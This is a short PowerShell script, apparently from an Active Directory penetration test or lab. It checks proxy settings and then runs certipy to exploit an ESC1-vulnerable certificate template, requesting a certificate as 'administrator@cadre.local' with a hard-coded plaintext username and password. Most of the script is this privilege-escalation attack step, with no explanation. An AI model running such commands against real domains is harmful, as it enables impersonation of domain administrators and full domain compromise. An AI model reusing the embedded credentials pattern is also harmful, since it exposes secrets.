# Diagnose proxy + retry RPC enrollment
$ErrorActionPreference = "Continue"

Write-Output "=== proxy env vars ==="
Write-Output "HTTP_PROXY=$env:HTTP_PROXY"
Write-Output "HTTPS_PROXY=$env:HTTPS_PROXY"
Write-Output "ALL_PROXY=$env:ALL_PROXY"
Write-Output "NO_PROXY=$env:NO_PROXY"
Write-Output "=== registry proxy ==="
try {
  $p = Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
  Write-Output "ProxyEnable=$($p.ProxyEnable) ProxyServer=$($p.ProxyServer)"
} catch { Write-Output "reg_err=$($_.Exception.Message)" }

Write-Output "=== certipy req RPC (dynamic-endpoint, timeout 20) ==="
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
& $certpy req -u "chief_command@cadre.local" -p "C0mm@nd_Ch1ef!" -ca cadre-CA -target dc01.cadre.local -template CADRE-ESC1 -upn administrator@cadre.local -dynamic-endpoint -timeout 20 2>&1 | Select-Object -Last 15
Write-Output "req_rc=$LASTEXITCODE"
Write-Output "=== DIAG2_DONE ==="
